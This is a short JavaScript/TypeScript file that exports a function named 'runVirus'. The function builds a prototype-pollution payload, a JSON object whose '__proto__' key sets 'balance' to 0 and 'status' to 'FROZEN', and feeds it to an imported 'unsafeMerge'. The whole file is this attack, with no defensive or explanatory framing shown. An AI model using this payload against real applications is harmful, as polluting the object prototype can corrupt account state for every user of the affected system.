import { unsafeMerge } from "./merge"

export function runVirus() {
  const payload = JSON.parse(`
    {
      "__proto__": {
        "balance": 0,
        "status": "FROZEN"
      }
    }
  `)

  unsafeMerge({}, payload)
}
